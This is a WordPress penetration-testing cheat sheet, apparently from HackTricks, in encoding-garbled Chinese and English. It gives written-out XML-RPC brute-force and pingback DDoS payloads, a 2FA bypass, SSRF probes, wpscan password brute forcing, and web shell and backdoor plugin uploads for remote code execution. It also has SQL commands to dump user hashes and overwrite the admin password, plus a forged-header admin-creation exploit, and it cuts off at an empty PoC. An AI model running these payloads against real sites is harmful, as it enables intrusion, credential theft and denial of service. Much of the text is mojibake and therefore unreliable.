# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

- **å·²ä¸Šä¼ ** çš„æ–‡ä»¶ä¼šæ”¾åˆ°: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **ä¸»é¢˜æ–‡ä»¶ä½äº /wp-content/themes/**ï¼Œæ‰€ä»¥å¦‚æœä½ ä¿®æ”¹ä¸»é¢˜çš„æŸäº› php æ¥è·å– RCEï¼Œä½ å¾ˆå¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** å¯ä»¥åœ¨: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php) è®¿é—® **404.php** æ–‡ä»¶ã€‚

- **å¦ä¸€ä¸ªæœ‰ç”¨çš„ url å¯èƒ½æ˜¯ï¼š** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- åœ¨ **wp-config.php** ä¸­å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚
- é»˜è®¤è¦æ£€æŸ¥çš„ç™»å½•è·¯å¾„ï¼š_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»è¦çš„ WordPress æ–‡ä»¶**

- `index.php`
- `license.txt` åŒ…å«æœ‰ç”¨ä¿¡æ¯ï¼Œä¾‹å¦‚å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
- `wp-activate.php` ç”¨äºåœ¨è®¾ç½®æ–° WordPress ç«™ç‚¹æ—¶çš„é‚®ä»¶æ¿€æ´»æµç¨‹ã€‚
- ç™»å½•ç›®å½•ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè¡¨ç¤º WordPress çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸é€šè¿‡ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶ã€XML ä½œä¸ºç¼–ç æœºåˆ¶æ¥ä¼ è¾“æ•°æ®ã€‚è¿™ç§é€šä¿¡æ–¹å¼å·²è¢« WordPress çš„ [REST API](https://developer.wordpress.org/rest-api/reference) æ‰€å–ä»£ã€‚
- `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜æ”¾æ’ä»¶å’Œä¸»é¢˜çš„ä¸»è¦ç›®å½•ã€‚
- `wp-content/uploads/` æ˜¯å¹³å°ä¸Šä¸Šä¼ æ–‡ä»¶å­˜æ”¾çš„ç›®å½•ã€‚
- `wp-includes/` æ˜¯å­˜æ”¾æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œå°éƒ¨ä»¶ã€‚
- `wp-sitemap.xml` åœ¨ WordPress 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWordPress ä¼šç”Ÿæˆä¸€ä¸ª sitemap XML æ–‡ä»¶ï¼ŒåŒ…å«æ‰€æœ‰å…¬å¼€æ–‡ç« ä»¥åŠå¯å…¬å¼€æŸ¥è¯¢çš„ post types å’Œ taxonomiesã€‚

**Post exploitation**

- `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€è®¤è¯å¯†é’¥å’Œç›å€¼ï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚è¯¥é…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥ç”¨äºå¯ç”¨ DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’æŸ¥æ—¶å¾ˆæœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

- **Administrator**
- **Editor**ï¼šå‘å¸ƒå¹¶ç®¡ç†è‡ªå·±çš„å’Œä»–äººçš„æ–‡ç« 
- **Author**ï¼šå‘å¸ƒå¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« 
- **Contributor**ï¼šæ’°å†™å¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« ä½†ä¸èƒ½å‘å¸ƒ
- **Subscriber**ï¼šæµè§ˆæ–‡ç« å¹¶ç¼–è¾‘ä¸ªäººèµ„æ–™

## **è¢«åŠ¨æšä¸¾**

### **è·å– WordPress ç‰ˆæœ¬**

æ£€æŸ¥æ˜¯å¦èƒ½æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **æºä»£ç ** ä¸­ï¼ˆç¤ºä¾‹æ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS é“¾æ¥æ–‡ä»¶

![](<../../images/image (533).png>)

- JavaScript æ–‡ä»¶

![](<../../images/image (524).png>)

### è·å–æ’ä»¶
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### é€šç”¨æå–ç‰ˆæœ¬
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ä¸»åŠ¨æšä¸¾

### Plugins and Themes

ä½ å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯ç”¨çš„ Plugins and Themesã€‚ä¸ºäº†å‘ç°å®ƒä»¬ï¼Œä½ éœ€è¦ **ä¸»åŠ¨åœ° Brute Force ä¸€ä»½ Plugins and Themes åˆ—è¡¨**ï¼ˆå¸Œæœ›æˆ‘ä»¬æœ‰åŒ…å«è¿™äº›åˆ—è¡¨çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼‰ã€‚

### ç”¨æˆ·

- **ID Brute:** ä½ å¯ä»¥é€šè¿‡ Brute Forcing ç”¨æˆ· ID ä» WordPress ç«™ç‚¹è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œè¿™æ„å‘³ç€è¯¥ id æ˜¯ **æœ‰æ•ˆ**ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œåˆ™è¯¥ id æ˜¯ **æ— æ•ˆ**ã€‚

- **wp-json:** ä½ ä¹Ÿå¯ä»¥å°è¯•é€šè¿‡æŸ¥è¯¢è·å–ç”¨æˆ·ä¿¡æ¯ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªèƒ½æš´éœ²ä¸€äº›ç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **åªä¼šæä¾›å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: åœ¨é€šè¿‡ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œæ˜¾ç¤ºçš„ **message** ä¼šä¸åŒï¼Œå¯ç”¨äºåˆ¤æ–­ **username æ˜¯å¦å­˜åœ¨**ã€‚

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (ä½ å¯ä»¥è‡ªåŠ¨åŒ–è¿™ä¸ªè¿‡ç¨‹[ using this](https://github.com/relarizky/wpxploit) ä¾‹å¦‚).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**æ£€æŸ¥**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** æ˜¯ä¸€äº›å¯ç”¨äº brute-force credentials çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼ä¸‹é¢çš„è¯·æ±‚ï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å½“å‡­è¯æ— æ•ˆæ—¶ï¼Œ200 çŠ¶æ€ç å“åº”ä¸­åº”å‡ºç°æ¶ˆæ¯ _"Incorrect username or password"_ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­è¯å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ä¼šå‡ºç°è·¯å¾„ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
å¦å¤–æœ‰ä¸€ç§æ›´å¿«çš„æ–¹æ³•å¯ä»¥ä½¿ç”¨ **`system.multicall`** å¯¹å‡­è¯è¿›è¡Œ brute-forceï¼Œå› ä¸ºä½ å¯ä»¥åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­å°è¯•å¤šä¸ª credsï¼š

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡ 2FA**

æ­¤æ–¹æ³•é¢å‘ç¨‹åºè€Œéäººç±»ï¼Œä¸”è¾ƒä¸ºè€æ—§ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰æœ‰æ•ˆçš„ creds ä½†ä¸»å…¥å£å— 2FA ä¿æŠ¤ï¼Œ**ä½ å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº› creds ç™»å½•ï¼Œä»è€Œç»•è¿‡ 2FA**ã€‚æ³¨æ„ï¼Œä½ æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°å¯ä»¥å®Œæˆçš„æ‰€æœ‰æ“ä½œï¼Œä½†ä½ ä»å¯èƒ½åƒ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ä¸­è§£é‡Šçš„é‚£æ ·è·å¾— RCEã€‚

**DDoS æˆ– port scanning**

å¦‚æœä½ èƒ½åœ¨æ–¹æ³•åˆ—è¡¨ä¸­æ‰¾åˆ° _**pingback.ping**_ï¼Œä½ å°±å¯ä»¥è®© Wordpress å‘ä»»æ„ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ç”¨äºè®© **thousands** çš„ Wordpress **sites** è®¿é—®åŒä¸€ä¸ª **location**ï¼ˆä»è€Œåœ¨è¯¥ä½ç½®é€ æˆ **DDoS**ï¼‰ï¼Œæˆ–è€…ä½ å¯ä»¥ç”¨å®ƒè®© **Wordpress** å» **scan** ä¸€äº›å†…éƒ¨ **network**ï¼ˆä½ å¯ä»¥æŒ‡å®šä»»æ„ç«¯å£ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ° **faultCode** çš„å€¼**å¤§äº** **0**ï¼ˆ17ï¼‰ï¼Œé‚£æ„å‘³ç€ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚

æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ **`system.multicall`** çš„ç”¨æ³•ï¼Œäº†è§£å¦‚ä½•æ»¥ç”¨æ­¤æ–¹æ³•å¯¼è‡´ DDoSã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

æ­¤æ–‡ä»¶é€šå¸¸ä½äº Wordpress ç«™ç‚¹çš„æ ¹ç›®å½•ï¼š **`/wp-cron.php`**\
å½“æ­¤æ–‡ä»¶è¢«**è®¿é—®**æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ª**ç¹é‡çš„** MySQL **æŸ¥è¯¢**ï¼Œå› æ­¤å¯èƒ½è¢«**æ”»å‡»è€…**ç”¨æ¥**é€ æˆ** **DoS**ã€‚\
å¦å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php` ä¼šåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆä»»ä½•å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½• Wordpress é¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç«™ç‚¹ä¸Šå¯èƒ½å¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

It is recommended to disable Wp-Cron and create a real cronjob inside the host that perform the needed actions in a regular interval (without causing issues).

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—® _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWorpress ç«™ç‚¹å¯èƒ½ä¼šå‘ä½ å‘èµ·è¯·æ±‚ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

è¯¥å·¥å…·æ£€æŸ¥æ˜¯å¦å­˜åœ¨ **methodName: pingback.ping** ä»¥åŠè·¯å¾„ **/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## é€šè¿‡è¦†ç›–ä¸€ä½è·å¾—è®¿é—®

è¿™ä¸å…¶è¯´æ˜¯ä¸€æ¬¡çœŸæ­£çš„æ”»å‡»ï¼Œä¸å¦‚è¯´æ˜¯ä¸€ç§å¥½å¥‡å¿ƒé©±åŠ¨çš„å®éªŒã€‚ åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»æ„ wordpress æ–‡ä»¶ä¸­çš„ 1 ä½ã€‚å› æ­¤ä½ å¯ä»¥å°†æ–‡ä»¶ `/var/www/html/wp-includes/user.php` ä¸­ä½ç½®ä¸º `5389` çš„ä½ç¿»è½¬ä¸º NOPï¼Œä»è€Œä½¿ NOT (`!`) æ“ä½œå¤±æ•ˆã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿ RCE**

**ä¿®æ”¹æ‰€ç”¨ä¸»é¢˜ä¸­çš„ phpï¼ˆéœ€è¦ç®¡ç†å‘˜å‡­æ®ï¼‰**

å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404 æ¨¡æ¿ï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š

![](<../../images/image (384).png>)

åœ¨ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥å·²æ›´æ–°çš„é¡µé¢ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæ‚¨éœ€è¦è®¿é—®ï¼š [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## æ’ä»¶ RCE

### PHP æ’ä»¶

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚\
ä½¿ç”¨ä¾‹å¦‚ä¸‹é¢çš„æ–¹æ³•åˆ›å»ºä½ çš„ PHP åé—¨ï¼š

![](<../../images/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°æ’ä»¶ï¼š

![](<../../images/image (722).png>)

ä¸Šä¼ æ’ä»¶å¹¶æŒ‰ Install Nowï¼š

![](<../../images/image (249).png>)

ç‚¹å‡» Proccedï¼š

![](<../../images/image (70).png>)

è¿™çœ‹èµ·æ¥å¯èƒ½ä¸ä¼šæœ‰ä»€ä¹ˆååº”ï¼Œä½†å¦‚æœä½ å» Mediaï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell å·²ä¸Šä¼ ï¼š

![](<../../images/image (462).png>)

è®¿é—®å®ƒï¼Œä½ ä¼šçœ‹åˆ°ç”¨äºæ‰§è¡Œ reverse shell çš„ URLï¼š

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

è¯¥æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´ä¸”å¯è¢«åˆ©ç”¨ä»¥è·å– web shell çš„æ¶æ„æ’ä»¶ã€‚è¯¥è¿‡ç¨‹é€šè¿‡ WordPress æ§åˆ¶é¢æ¿æ‰§è¡Œï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š

1. **æ’ä»¶è·å–**ï¼šä»åƒ Exploit DB è¿™æ ·çš„æ¥æºè·å–æ’ä»¶ï¼Œä¾‹å¦‚ [**here**](https://www.exploit-db.com/exploits/36374).
2. **æ’ä»¶å®‰è£…**ï¼š
- åœ¨ WordPress æ§åˆ¶é¢æ¿ä¸­ï¼Œè½¬åˆ° `Dashboard > Plugins > Upload Plugin`ã€‚
- ä¸Šä¼ ä¸‹è½½çš„æ’ä»¶çš„ zip æ–‡ä»¶ã€‚
3. **æ’ä»¶æ¿€æ´»**ï¼šæ’ä»¶æˆåŠŸå®‰è£…åï¼Œå¿…é¡»é€šè¿‡æ§åˆ¶é¢æ¿å°†å…¶æ¿€æ´»ã€‚
4. **åˆ©ç”¨**ï¼š
- å½“å®‰è£…å¹¶æ¿€æ´»äº†åä¸º "reflex-gallery" çš„æ’ä»¶åï¼Œå¯å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºå®ƒå·²çŸ¥å­˜åœ¨æ¼æ´ã€‚
- Metasploit framework æä¾›äº†é’ˆå¯¹è¯¥æ¼æ´çš„ exploitã€‚é€šè¿‡åŠ è½½ç›¸åº”æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯ä»¥å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹è¯¥ç«™ç‚¹çš„æœªæˆæƒè®¿é—®ã€‚
- æ³¨æ„ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç«™ç‚¹çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…å«å±•ç¤ºåœ¨ WordPress æ§åˆ¶é¢æ¿ä¸­å®‰è£…å¹¶æ¿€æ´»æ’ä»¶æ­¥éª¤çš„å›¾ç¤ºã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹ä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´æ˜¯éæ³•ä¸”ä¸é“å¾·çš„ã€‚æ­¤ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œä»…åœ¨åˆæ³•èƒŒæ™¯ä¸‹ï¼Œä¾‹å¦‚åœ¨è·å¾—æ˜ç¡®è®¸å¯çš„æ¸—é€æµ‹è¯•ä¸­ä½¿ç”¨ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## ä» XSS åˆ° RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œæ—¨åœ¨å°† **Cross-Site Scripting (XSS)** æ¼æ´å‡çº§ä¸º **Remote Code Execution (RCE)** æˆ–å…¶å®ƒ WordPress çš„ä¸¥é‡æ¼æ´ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ã€‚å®ƒä¸º Wordpress ç‰ˆæœ¬ 6.X.Xã€5.X.X å’Œ 4.X.X æä¾›æ”¯æŒï¼Œå¹¶å…è®¸ï¼š
- _**Privilege Escalation:**_ åœ¨ WordPress ä¸­åˆ›å»ºç”¨æˆ·ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ å°†ä½ çš„è‡ªå®šä¹‰æ’ä»¶ï¼ˆbackdoorï¼‰ä¸Šä¼ åˆ° WordPressã€‚
- _**(RCE) Built-In Plugin Edit:**_ åœ¨ WordPress ä¸­ç¼–è¾‘å†…ç½®æ’ä»¶ã€‚
- _**(RCE) Built-In Theme Edit:**_ åœ¨ WordPress ä¸­ç¼–è¾‘å†…ç½®ä¸»é¢˜ã€‚
- _**(Custom) Custom Exploits:**_ ä¸ºç¬¬ä¸‰æ–¹ WordPress æ’ä»¶/ä¸»é¢˜æä¾›è‡ªå®šä¹‰ exploitsã€‚

## ååˆ©ç”¨

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ admin å¯†ç :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½å¯¹äºå‘ç°å…¶åŠŸèƒ½æ€§æ¼æ´è‡³å…³é‡è¦ã€‚ä¸‹é¢çš„è¦ç‚¹åˆ—å‡ºäº†æ’ä»¶å¯èƒ½æš´éœ²åŠŸèƒ½çš„æ–¹å¼ï¼Œç¤ºä¾‹æ˜“å—å½±å“çš„æ’ä»¶å¯è§ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ã€‚

- **`wp_ajax`**

æ’ä»¶å°†åŠŸèƒ½æš´éœ²ç»™ç”¨æˆ·çš„æ–¹å¼ä¹‹ä¸€æ˜¯é€šè¿‡ AJAX handlersã€‚è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘ã€æˆæƒæˆ–è®¤è¯æ¼æ´ã€‚æ­¤å¤–ï¼Œè¿™ç±»å‡½æ•°å¸¸å¸¸åŸºäº Wordpress nonce çš„å­˜åœ¨æ¥åˆ¤æ–­è®¤è¯å’Œæˆæƒï¼Œè€Œ **ä»»ä½•åœ¨ Wordpress å®ä¾‹ä¸­å·²è®¤è¯çš„ç”¨æˆ·éƒ½å¯èƒ½æ‹¥æœ‰è¯¥ nonce**ï¼ˆä¸å…¶è§’è‰²æ— å…³ï¼‰ã€‚

ä»¥ä¸‹æ˜¯å¯ç”¨äºåœ¨æ’ä»¶ä¸­æš´éœ²å‡½æ•°çš„å‡½æ•°ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**ä½¿ç”¨ `nopriv` ä¼šä½¿è¯¥ç«¯ç‚¹å¯¹ä»»ä½•ç”¨æˆ·å¯è®¿é—®ï¼ˆç”šè‡³æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚**

> [!CAUTION]
> æ­¤å¤–ï¼Œå¦‚æœå‡½æ•°åªæ˜¯ä½¿ç”¨ `wp_verify_nonce` æ¥æ£€æŸ¥ç”¨æˆ·æˆæƒï¼Œ`wp_verify_nonce` ä»…æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œé€šå¸¸ä¸ä¼šæ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ä½æƒé™ç”¨æˆ·å¯èƒ½å¯ä»¥è®¿é—®é«˜æƒé™æ“ä½œã€‚

- **REST API**

ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨ `register_rest_route` å‡½æ•°åœ¨ wordpress ä¸­æ³¨å†Œ REST API æ¥æš´éœ²å‡½æ•°ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šç”¨æˆ·æ˜¯å¦è¢«æˆæƒè°ƒç”¨è¯¥ API æ–¹æ³•ã€‚

**å¦‚æœä½¿ç”¨å†…ç½®çš„ `__return_true` å‡½æ•°ï¼Œå®ƒä¼šç›´æ¥è·³è¿‡ç”¨æˆ·æƒé™æ£€æŸ¥ã€‚**

- **ç›´æ¥è®¿é—® PHP æ–‡ä»¶**

å½“ç„¶ï¼ŒWordpress ä½¿ç”¨ PHPï¼Œæ’ä»¶ä¸­çš„æ–‡ä»¶å¯ä»¥ç›´æ¥é€šè¿‡ web è®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœæŸä¸ªæ’ä»¶æš´éœ²äº†ä»…é€šè¿‡è®¿é—®æ–‡ä»¶å³å¯è§¦å‘çš„æ˜“å—æ”»å‡»åŠŸèƒ½ï¼Œä»»ä½•ç”¨æˆ·éƒ½èƒ½å¤Ÿåˆ©ç”¨å®ƒã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€äº›æ’ä»¶ä¸ºå†…éƒ¨é›†æˆæˆ– reverse proxies å®ç°äº†â€œtrusted headerâ€å¿«æ·æ–¹å¼ï¼Œç„¶åä½¿ç”¨è¯¥ header ä¸º REST è¯·æ±‚è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å¦‚æœè¯¥ header æœªè¢«ä¸Šæ¸¸ç»„ä»¶ä»¥å¯†ç å­¦æ–¹å¼ç»‘å®šåˆ°è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ å®ƒï¼Œä»è€Œä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®æœ‰ç‰¹æƒçš„ REST è·¯ç”±ã€‚

- Impact: æœªç»èº«ä»½éªŒè¯çš„æƒé™æå‡ä¸ºç®¡ç†å‘˜ï¼Œé€šè¿‡æ ¸å¿ƒ users REST è·¯ç”±åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1`ï¼ˆå¼ºåˆ¶ç”¨æˆ· ID ä¸º 1ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªç®¡ç†å‘˜è´¦å·ï¼‰ã€‚
- Exploited route: `POST /wp-json/wp/v2/users`ï¼ŒåŒ…å«æå‡è§’è‰²çš„æ•°ç»„ã€‚

PoC
```http
